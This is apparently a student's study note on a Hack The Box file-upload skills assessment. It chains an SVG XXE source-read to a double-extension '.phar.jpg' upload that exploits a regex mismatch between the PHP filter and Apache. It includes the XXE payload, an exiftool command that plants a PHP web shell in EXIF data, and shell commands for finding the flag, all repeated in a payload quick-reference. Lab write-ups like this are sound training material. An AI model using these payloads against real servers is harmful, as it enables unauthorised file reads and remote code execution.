---
tags: [htb, file-upload, xxe, svg, rce, apache, exif, web]
assessment: HTB File Upload Attacks — Skills Assessment
type: academy
created: 2026-11-05
---

# File Upload → RCE (Full Attack Chain)

> [!summary] Core idea
> No single trick gets the flag — each step produces the information the next one needs. When an upload filter looks airtight, stop asking *"how do I trick the filter?"* and start asking *"what else reads or runs this file after it's stored, and does that system see the file the same way the filter does?"* **The vulnerability lives in the disagreement between layers.**

---

## The situation

An upload form defended by **three independent filters**:

1. **Blacklist** — rejects filenames containing `.php`, `.phps`, `.phtml`
2. **Whitelist** — requires the name to *end* in `.jpg` / `.png` / `.svg` etc.
3. **MIME check** — `mime_content_type()` inspects the actual bytes and demands a real image

Together these block every obvious "upload a PHP shell" attempt.

> [!tip] Read the error messages — they're a map
> The error tells you **which** filter you tripped, so you can attack them one at a time.
>
> | Error | Filter that fired |
> |---|---|
> | `Extension not allowed` | Blacklist (filename) |
> | `Only images are allowed` | Whitelist or MIME check (content) |

---

## Step 1 — Get a *read* primitive before trying to *execute*

PHP uploads were blocked, but **`.svg` passed all three filters** (ends in `g`, and `image/svg+xml` is an allowed MIME type).

SVG matters because to the server it isn't really an image — it's **XML**, and XML parsers support **external entities (XXE)**. That makes an SVG a way to **read files off the server** without executing anything.

**Read the application source via XXE:**

```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

- `php://filter/convert.base64-encode` is needed because raw PHP source (`<?php ?>`) contains characters that break the XML parse. Base64 gets the bytes out cleanly.
- Upload as `.svg`, **view the rendered file** (the XXE fires on render, not on upload), grab the base64 blob, then decode:

```bash
echo 'PD9waHAK...blob...' | base64 -d
```

> [!note] Pivotal move
> Once you can read source, you stop guessing and start *knowing*.

---

## Step 2 — Source turns unknowns into knowns

Reading `upload.php` revealed three things no amount of fuzzing would give:

```php
$target_dir = "./user_feedback_submissions/";
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
```

- **Where uploads go:** `./user_feedback_submissions/` — a folder no wordlist would guess.
- **How files are renamed:** `date('ymd') + '_' + originalname` → the stored path is **completely predictable**. No UUID, no hash.
- **Exactly how the filters work**, letter for letter:

```php
// blacklist
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) { die("Extension not allowed"); }

// whitelist
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) { die("Only images are allowed"); }

// type test (Content-Type header AND mime_content_type())
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) { die("Only images are allowed"); }
}
```

---

## Step 3 — The key insight: two layers that disagree

Two **independent** systems make decisions about your file:

- The **upload filter (PHP)** decides whether to *accept* it → checks the **end** of the filename (`...g$`).
- **Apache** decides whether to *execute* it as PHP → its `FilesMatch` config checks whether an executable extension appears **anywhere** in the name (no end anchor).

They don't talk to each other, and they read the filename differently. **That disagreement is the vulnerability.**

Typical misconfigured Apache directive:

```apache
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

No `$` → matches `.phar` **anywhere** in the name.

### `shell.phar.jpg` threads the needle

| Layer | What it checks | Result |
|---|---|---|
| Blacklist | contains `.php` / `.phps` / `.phtml`? | No (`.phar` ≠ those) → **passes** |
| Whitelist | ends in `...g`? | Yes, `.jpg` → **passes** |
| MIME | real image content? | Yes (see Step 4) → **passes** |
| Apache | contains `.phar` anywhere? | Yes → **executes as PHP** |

To the upload filter it's an image. To Apache it's code. **Same file.**

---

## Step 4 — Beat the MIME check with EXIF

`mime_content_type()` reads the actual bytes, so faking a header like `GIF89a` and bolting PHP on **won't** work — it still sees the PHP and rejects.

Fix: use a **genuinely valid JPEG** and hide the PHP in its **EXIF metadata** (a comment field). The file stays a valid image front-to-back, but the PHP rides along inside it.

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg -o shell.phar.jpg
```

When Apache runs the file as PHP, the interpreter scans the binary, finds the `<?php` tag in the comment, and executes it.

---

## Step 5 — Execute

Upload `shell.phar.jpg` with `Content-Type: image/jpeg`. The source told you the directory and naming scheme, so the URL is predictable — use **today's** date in `ymd`:

```
/contact/user_feedback_submissions/<YYMMDD>_shell.phar.jpg?cmd=id
```

`id` returning `uid=33(www-data)` = **command execution confirmed**.

> [!info] Reading the output
> It comes back **mixed into the JPEG binary gibberish** — scroll through it, or use Ctrl-U (view source) to read it cleanly.

---

## Step 6 — Find the flag (don't guess it)

`cat /flag.txt` returned blank — the flag was deliberately named to defeat guessing:

```
flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
```

So **enumerate** with the shell instead of assuming:

```
?cmd=ls%20-la%20/
?cmd=find%20/%20-maxdepth%202%20-name%20'flag*'%202>/dev/null
```

Then `cat` the real name (URL-encode spaces as `%20`):

```
?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
```

> [!note] Same lesson as the uploads folder
> **Enumerate, don't assume.** Code execution let you list and read — that's how you found both the folder name and the flag name.

---

## The chain in one line

**SVG/XXE → read source → source reveals filter logic + predictable upload path → filter logic reveals the filter-vs-Apache gap → `.phar.jpg` + EXIF gets execution → execution lets you enumerate and read the real flag name.**

---

## Reusable takeaways

- [ ] **Error messages are signal, not noise** — they tell you which defense fired.
- [ ] **Get a read primitive before an execute primitive** — reading source turns guesswork into certainty.
- [ ] **Look for layer disagreement** — the upload filter and the web server's execution config read the filename differently; the gap between them is the bug.
- [ ] **Content checks need *genuinely valid* files** — hide payloads in metadata (EXIF) rather than faking headers.
- [ ] **Enumerate, don't assume** — randomized names (uploads dir, flag file) beat guessing; code execution lets you list and read.

## Payload quick-reference

```xml
<!-- SVG XXE: read source as base64 -->
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

```bash
# Build the image-wrapped shell
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg -o shell.phar.jpg
```

```
# Trigger + enumerate (upload as Content-Type: image/jpeg)
/contact/user_feedback_submissions/<YYMMDD>_shell.phar.jpg?cmd=id
...?cmd=find%20/%20-maxdepth%202%20-name%20'flag*'%202>/dev/null
...?cmd=cat%20/flag_<hash>.txt
```
